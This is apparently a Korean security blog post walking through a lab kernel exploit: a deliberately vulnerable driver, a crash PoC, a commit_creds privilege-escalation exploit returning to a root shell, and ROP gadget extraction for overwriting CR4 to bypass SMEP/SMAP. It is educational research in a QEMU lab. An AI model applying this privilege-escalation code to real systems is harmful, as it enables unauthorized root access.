

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="G4EG4EGAE">
  <meta name="keywords" content="">
  
  <title>[Research] Linux Kernel Exploit - Bypassing SMAP - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>G4EG4EG4E's TECHNOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="[Research] Linux Kernel Exploit - Bypassing SMAP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-02 09:00" pubdate>
        October 2, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      52
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Linux Kernel Exploit - Bypassing SMAP</h1>
            
            <div class="markdown-body">
              <h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SMAP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p>
</br>
</br>

<h2 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h2></br>

<p><img src="/img/cr4.PNG" srcset="/img/loading.gif" lazyload></p>
</br>

<p><b>SMAP(Supervisor Mode Access Prevention)</b>은 supervisor mode(ring0)에서 특정 주소에 있는 데이터를 접근할 경우 해당 주소가 만약 user mode(ring3)의 데이터라고 할 경우 이를 접근할 수 없도록 하는 보호기법이다.</p>
</br>

<p>SMAP은 CPU의 CR4 Register의 SMAP에 해당하는 부분의 비트를 키거나 끔으로 적용이 가능하다. 또한 SMAP이 적용되어 있을 경우 Kernel ROP를 이용하면 우회가 가능하다. 이는 결과적으로 지난 포스트에서의 익스플로잇 코드를 통해서도 공격자는 권한 상승 후의 쉘 획득이 가능하다는 것을 의미한다. Kernel ROP를 통해 우회를 진행하였음으로 해당 포스트에서는 CR4 레지스터의 값을 변조하는 형태로 익스플로잇을 진행해보려고 한다.</p>
<p></br></br></p>
<h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep,smap \
</code></pre>
<p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 적용된 보호기법을 확인해보면 KASLR의 경우는 비활성화 해두었으며 SMEP과 SMAP의 경우는 활성화 되어 있다. </p>
<p></br></br></p>
<h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure>

<p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p>
<p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line30~line33에 의하여 커널에서 메모리를 동적할당한 후 유저영역에서의 메모리를 해당 데이터의 크기만큼 복사하는 것을 확인할 수 있다.</p>
<p>이를 고려해보면 사용자가 입력한 데이터(untrusted input)의 크기를 제한하지 않는 문제로 인해서 스택 버퍼기반의 오버플로우가 발생할 것으로 예상된다.</p>
<p></br></br></p>
<h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p>
</br>

<h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br>    size_t payload[18] = &#123;0, &#125;;<br>    <br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    memset(payload, 0x41, 40);<br>    payload[4] = 0x4343434343434343;   <br><br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>디바이스 드라이버를 제어하는 코드를 작성하였다. 버퍼에 데이터를 어느정도 작성해야 Return Address를 컨트롤 할 수 있는가를 파악하기 위해서 연속적인 형태의 입력인 “AAA…ACCC…C…”를 입력하였다. 만약 RIP가 해당 입력값 중 하나의 값으로 변조된다면 이는 사용자의 입력으로 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다. 참고로 스택 카나리는 비활성화 상태이다.</p>
</br>

<h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./crash 
[    5.845709] arr : 0
[    5.847836] general protection fault: 0000 [#1] SMP NOPTI
[    5.850227] CPU: 0 PID: 69 Comm: crash Tainted: G           O      5.8.5 #1
[    5.851984] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    5.854040] RIP: 0010:0x4343434343434343
[    5.854920] Code: Bad RIP value.
[    5.855637] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    5.859450] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261
[    5.859996] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    5.860456] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007
[    5.862713] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141
[    5.863229] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0
[    5.863786] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    5.864440] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.865603] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0
[    5.866234] Call Trace:
[    5.867406]  ? do_syscall_64+0x3e/0x70
[    5.868196]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    5.869328] Modules linked in: test(O)
[    5.870959] ---[ end trace 0fcca97aa748deff ]---
[    5.871920] RIP: 0010:0x4343434343434343
[    5.872678] Code: Bad RIP value.
[    5.873270] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    5.873831] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261
[    5.874345] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    5.874894] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007
[    5.875395] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141
[    5.875932] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0
[    5.876434] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    5.877037] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.877708] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0
[    5.878296] Kernel panic - not syncing: Fatal exception
[    5.879164] Kernel Offset: disabled
[    5.879860] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.

해당 결과를 통해 RIP가 0x4343434343434343로 변조되었음을 확인할 수 있었고 해당 값은 사용자가 입력할 버퍼의 32만큼의 입력한 뒤의 값이다. 그러므로 payload[4]에 값을 작성할 경우 해당 값으로 실행흐름을 변조할 수 있다.
</code></pre>
<p>공격결과는 예상하였던 것과 같이 실행흐름을 변조할 수 있음으로 파악된다. 해당 부분에서 추가적으로 확인할 수 있는 것은 <b>CR4 레지스터의 값</b>이다. 해당 값의 경우는 <b>0x00000000003006f0</b>으로 이를 바이너리 형태로 변경한다면 <b>00000000 00000000 00000000 00000000 00000000 00110000 00000110 11110000</b> 다음과 같다. 해당 결과를 해석해볼 경우 SMEP과 SMAP이 적용되어 있는 것을 확인할 수 있다.</p>
<p></br></br></p>
<h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p>
<p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p>
</br>

<h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. CR4 레지스터 변조를 통한 SMEP, SMAP 비활성화
STEP2. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승
STEP3. 사용자 모드(user mode)로의 전환
STEP4. shell 획득
</code></pre>
<p>다음의 시나리오는 SMEP, SMAP이 적용되어 있지 않은 일반적인 형태의 공격(exploit)과 유사하다. Memory Randomization이 적용되어 있지 않기 때문에 실행시키고자 하는 함수인 commit_creds(), prepare_kernel_cred()를 하드코딩하여 값을 작성해도 된다.</p>
<p>여기서 고려해야하는 사항은 이전 포스트에서 작성하였던 공격 시나리오의 경우 유저 영역의 함수에서 STEP2, STEP3, STEP4를 진행한다. 하지만 SMEP, SMAP이 적용되어 있기 때문에 STEP1의 과정을 거치지 않는다면 문제가 발생할 것이다.</p>
</br>

<h3 id="공격-코드-1"><a href="#공격-코드-1" class="headerlink" title="공격 코드(1)"></a>공격 코드(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="공격-결과-1"><a href="#공격-결과-1" class="headerlink" title="공격 결과(1)"></a>공격 결과(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./exploit 
[    5.284800] arr : 0
[    5.285076] unable to execute userspace code (SMEP?) (uid: 1000)
[    5.287133] BUG: unable to handle page fault for address: 0000000000400bc4
[    5.290793] #PF: supervisor instruction fetch in kernel mode
[    5.291958] #PF: error_code(0x0011) - permissions violation
[    5.293203] PGD 1d954067 P4D 1d954067 PUD 1d955067 PMD 1d952067 PTE 1e0ef025
[    5.294763] Oops: 0011 [#1] SMP NOPTI
[    5.295289] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #2
[    5.295987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    5.296780] RIP: 0010:0x400bc4
[    5.297402] Code: Bad RIP value.
[    5.297736] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    5.298131] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261
[    5.298608] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0
[    5.299073] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900
[    5.299522] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141
[    5.299982] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000
[    5.300503] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000
[    5.301110] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.301557] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0
[    5.302173] Call Trace:
[    5.303023]  ? ksys_write+0x9c/0xd0
[    5.308759]  ? do_syscall_64+0x3e/0x70
[    5.309125]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    5.310466] Modules linked in: test(O)
[    5.312506] CR2: 0000000000400bc4
[    5.313227] ---[ end trace c3b44d8ed90feeeb ]---
[    5.314069] RIP: 0010:0x400bc4
[    5.314341] Code: Bad RIP value.
[    5.314574] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    5.314908] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261
[    5.316170] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0
[    5.316755] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900
[    5.317232] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141
[    5.317685] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000
[    5.318159] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000
[    5.318700] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.319070] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0
[    5.319614] Kernel panic - not syncing: Fatal exception
[    5.320346] Kernel Offset: disabled
[    5.321058] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x00000000813f0950
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
<p>공격 결과(1)을 통해 다음과 같은 방법으로는 익스플로잇이 가능하지 않음을 알 수 있다. 이를 고려하여 CR4 레지스터를 변조하여 SMEP과 SMAP을 비활성화하여 공격을 진행할 수 있다. CR4 레지스터를 변조할 수 있는 가젯(gadget)을 찾아 페이로드를 구성하여 보겠다.</p>
</br>


<h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p>CR4 레지스터를 변조하기 위해서 필요한 가젯을 찾아봐야 한다. 사용자가 입력한 값으로 CR4 레지스터를 변조해야하며 현재 사용자의 입력이 위치하는 메모리는 스택으로 볼 수 있다. 이러한 것들을 고려하여 페이로드를 구상해보겠다.</p>
</br>

<pre><code>pop register
mov cr4, register
&amp;payload
</code></pre>
<p>스택에 사용자가 입력한 데이터가 위치하며 이를 특정 레지스터에 담을 수 있는 가젯을 찾아 이를 cr4 레지스터에 위치하도록 해야한다. 이후 실행흐름을 유저영역의 함수로 변조한다면 정상적으로 코드가 실행되어 권한이 상승된 형태로 쉘을 획득할 수 있을 것으로 판단된다.</p>
</br>

<h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><pre><code>$ ROPgadget --binary vmlinux | grep &#39;mov cr4&#39;
0xffffffff8102f82c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f854
0xffffffff8104c097 : add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e
0xffffffff8102f82e : add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f854
0xffffffff8104c095 : add byte ptr [rax], dl ; add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e
0xffffffff8104c099 : mov cr4, rax ; jmp 0xffffffff8104c09e
0xffffffff810973c0 : mov cr4, rax ; ret
0xffffffff8102f832 : mov cr4, rdi ; jmp 0xffffffff8102f854
0xffffffff810973bf : nop ; mov cr4, rax ; ret
0xffffffff8104c094 : or eax, 0x1000 ; mov cr4, rax ; jmp 0xffffffff8104c09e
0xffffffff8102f830 : xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f854 
</code></pre>
</br>

<pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rax&quot;
ffffffff8197ee5a:    58                       pop    rax
ffffffff8197ee5b:    c3                       ret  
</code></pre>
